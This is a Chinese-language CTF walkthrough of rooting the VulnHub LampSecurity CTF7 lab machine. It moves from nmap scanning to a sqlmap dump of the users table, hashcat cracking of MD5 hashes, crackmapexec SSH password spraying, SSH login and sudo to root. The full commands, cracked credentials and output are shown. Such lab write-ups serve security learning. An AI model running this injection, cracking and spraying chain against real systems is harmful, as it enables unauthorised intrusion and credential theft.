# lampSecurityCTF7 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/lampsecurity-ctf7,86/
-   下载地址：https://download.vulnhub.com/lampsecurity/CTF7plusDocs.zip

## 信息收集：

### 主机发现

>   nmap -sn 192.168.2.1 # 扫描当前网段查找新出现的靶机

```shell
└─$ nmap -sn 192.168.2.1/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 13:53 HKT
Nmap scan report for 192.168.2.1
Host is up (0.00081s latency).
Nmap scan report for 192.168.2.2
Host is up (0.00073s latency).
Nmap scan report for 192.168.2.128
Host is up (0.00017s latency).
Nmap scan report for 192.168.2.137
Host is up (0.019s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.67 seconds
```



### 端口扫描

>   nmap -sT --min-rate 10000 -p- 192.168.2.137 -oA Ports/tcp

```shell
# 扫描tcp端口
└─$ nmap -sT --min-rate 10000 -p- 192.168.2.137 -oA Ports/tcp
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 14:00 HKT
Nmap scan report for 192.168.2.137
Host is up (0.00050s latency).
Not shown: 65508 filtered tcp ports (no-response), 18 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
901/tcp   open   samba-swat
5900/tcp  closed vnc
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds

# 扫描udp端口
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.137 -oA Ports/udp
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 14:01 HKT
Warning: 192.168.2.137 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.137
Host is up (0.0010s latency).
All 65535 scanned ports on 192.168.2.137 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)
MAC Address: 00:0C:29:4E:09:A9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds

```



### 服务扫描及操作系统探测

>sudo nmap -sC -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.2.137 -oA Script/sc

```shell
└─$ sudo nmap -sC -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.2.137 -oA Script/sc
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 14:05 HKT
Nmap scan report for 192.168.2.137
Host is up (0.00035s latency).

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 418a0d5d596045c4c415f38a8dc09919 (DSA)
|_  2048 66fba3b4747266f492738fbf61ec8b35 (RSA)
80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
|_http-server-header: Apache/2.2.15 (CentOS)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Mad Irish Hacking Academy
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.5.10-125.el6 (workgroup: MYGROUP)
901/tcp   open   http        Samba SWAT administration server
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
5900/tcp  closed vnc
8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
|_http-server-header: Apache/2.2.15 (CentOS)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Admin :: Mad Irish Hacking Academy
|_Requested resource was /login.php
|_http-open-proxy: Proxy might be redirecting requests
10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin
MAC Address: 00:0C:29:4E:09:A9 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.13
Network Distance: 1 hop

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.5.10-125.el6)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: localhost
|_  System time: 2023-05-08T08:46:27-04:00
|_clock-skew: mean: -14d15h19m00s, deviation: 2h49m45s, median: -14d17h19m02s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.45 seconds

```



### 默认脚本进行扫描

>nmap --script=vuln -p22,80,137,138,139,901,5900,8080,10000 192.168.2.137 -oA Script/vuln

```shell
└─$ nmap --script=vuln -p22,80,137,138,139,901,5900,8080,10000 192.168.2.137 -oA Script/vuln
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 14:06 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.137
Host is up (0.00052s latency).

PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /webmail/: Mail folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|_  /webalizer/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
901/tcp   open   samba-swat
5900/tcp  closed vnc
8080/tcp  open   http-proxy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|   /login.php: Possible admin folder
|   /phpmyadmin/: phpMyAdmin
|   /docs/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /inc/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       httponly flag not set
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
10000/tcp open   snet-sensor-mgmt

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 112.86 seconds
```

## web发现

-   查看首页发现存在`get`型数字注入
-   ![image-20230523142246507](https://raw.githubusercontent.com/r0o983/images/main/image-20230523142246507.png)

### 调用`sqlmap`进行注入测试

```shell
# 获取当前数据库
sqlmap -u "http://192.168.2.137/profile&id=20" --dbms=mysql --current-db

# 获取表信息
sqlmap -u "http://192.168.2.137/profile&id=20" --dbms=mysql -D website --tables

# 获取列信息
sqlmap -u "http://192.168.2.137/profile&id=20" --dbms=mysql -D website -T users --columns

# 获取其中具体字段的值并进行下载
sqlmap -u "http://192.168.2.137/profile&id=20" --dbms=mysql -D website -T users -C 'username,password' --dump

[15:16:17] [INFO] resumed: 'e22f07b17f98e0d9d364584ced0e3c18','brian@localhost.localdomain'
[15:16:17] [INFO] resumed: '0d9ff2a4396d6939f80ffe09b1280ee1','john@localhost.localdomain'
[15:16:17] [INFO] resumed: '2146bf95e8929874fc63d54f50f1d2e3','alice@localhost.localdomain'
[15:16:17] [INFO] resumed: '9f80ec37f8313728ef3e2f218c79aa23','ruby@localhost.localdomain'
[15:16:17] [INFO] resumed: '5d93ceb70e2bf5daa84ec3d0cd2c731a','leon@localhost.localdomain'
[15:16:17] [INFO] resumed: 'ed2539fe892d2c52c42a440354e8e3d5','julia@localhost.localdomain'
[15:16:17] [INFO] resumed: '9c42a1346e333a770904b2a2b37fa7d3','michael@localhost.localdomain'
[15:16:17] [INFO] resumed: '3a24d81c2b9d0d9aaf2f10c6c9757d4e','bruce@localhost.localdomain'
[15:16:17] [INFO] resumed: '4773408d5358875b3764db552a29ca61','neil@localhost.localdomain'
[15:16:17] [INFO] resumed: 'b2a97bcecbd9336b98d59d9324dae5cf','charles@localhost.localdomain'
[15:16:17] [INFO] resumed: '4cb9c8a8048fd02294477fcb1a41191a','foo@bar.com'
[15:16:17] [INFO] resumed: 'b0baee9d279d34fa1dfd71aadb908c3f','222@11'
[15:16:17] [INFO] resumed: '098f6bcd4621d373cade4e832627b4f6','test@nowhere.com'

```

-   将账号密码保存后进行密码碰撞操作

### 使用`hashcat`进行密码碰撞

>hashcat -m 0 -a 0 Password-crash /usr/share/wordlists/rockyou.txt
>
>参数说明：
>
>​	-m 指定使用md5进行密码碰撞
>
>​	-a 使用标准强度进行破解

```shell
└─$ hashcat -m 0 -a 0 Password-crash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz, 2910/5885 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 13 digests; 13 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b0baee9d279d34fa1dfd71aadb908c3f:11111                    
ed2539fe892d2c52c42a440354e8e3d5:madrid                   
4cb9c8a8048fd02294477fcb1a41191a:changeme                 
5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234                 
098f6bcd4621d373cade4e832627b4f6:test                     
b2a97bcecbd9336b98d59d9324dae5cf:chuck33                  
2146bf95e8929874fc63d54f50f1d2e3:turtles77                
9c42a1346e333a770904b2a2b37fa7d3:somepassword             
e22f07b17f98e0d9d364584ced0e3c18:my2cents                 
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: Password-crash
Time.Started.....: Tue May 23 15:09:02 2023 (4 secs)
Time.Estimated...: Tue May 23 15:09:06 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4465.0 kH/s (0.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 9/13 (69.23%) Digests (total), 9/13 (69.23%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 62%

Started: Tue May 23 15:09:02 2023
Stopped: Tue May 23 15:09:07 2023
```

-   将处理之后的用户名以及密码保存到文本中进行碰撞



### 使用`crackmapexec`进行密码碰撞

>   crackmapexec ssh 192.168.2.137 -p password -u usernmae --continue-on-success  | grep "+"
>
>   参数说明：
>
>   ​	ssh 指定需要的碰撞类型
>
>   ​	-p 需要碰撞的密码文件
>
>   ​	-u 需要碰撞的用户名文件
>
>   ​	--continue-on-success

```shell
└─$ crackmapexec ssh 192.168.2.137 -p password -u usernmae --continue-on-success  | grep "+"
SSH         192.168.2.137   22     192.168.2.137    [+] brian:my2cents 
SSH         192.168.2.137   22     192.168.2.137    [+] alice:turtles77 
SSH         192.168.2.137   22     192.168.2.137    [+] leon:qwer1234 
SSH         192.168.2.137   22     192.168.2.137    [+] julia:madrid 
SSH         192.168.2.137   22     192.168.2.137    [+] michael:somepassword 
SSH         192.168.2.137   22     192.168.2.137    [+] charles:chuck33 
```

-   进行登陆尝试，需要指定的主机密钥类型

-   >   └─$ ssh brian@192.168.2.137
    >   Unable to negotiate with 192.168.2.137 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

-   修改密钥类型继续进行尝试--> 成功登陆并获得shell权限

-   ```shell
    └─$ ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss brian@192.168.2.137
    The authenticity of host '192.168.2.137 (192.168.2.137)' can't be established.
    RSA key fingerprint is SHA256:GfrI8RJ0/Xy8Za7qDP9Gm+RaoxuVz1GWo15hvn8+rdI.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '192.168.2.137' (RSA) to the list of known hosts.
    brian@192.168.2.137's password: 
    Last login: Mon May  8 10:16:58 2023 from 192.168.2.128
    [brian@localhost ~]$ uname -a
    Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux
    [brian@localhost ~]$ ip addr
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:4e:09:a9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.137/24 brd 192.168.2.255 scope global eth1
        inet6 fe80::20c:29ff:fe4e:9a9/64 scope link 
           valid_lft forever preferred_lft forever
    [brian@localhost ~]$ sudo -l
    [sudo] password for brian: 
    Matching Defaults entries for brian on this host:
        requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
        env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
        XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
    
    User brian may run the following commands on this host:
        (ALL) ALL
    [brian@localhost ~]$ sudo /bin/bash
    [root@localhost brian]# 
    
    ```
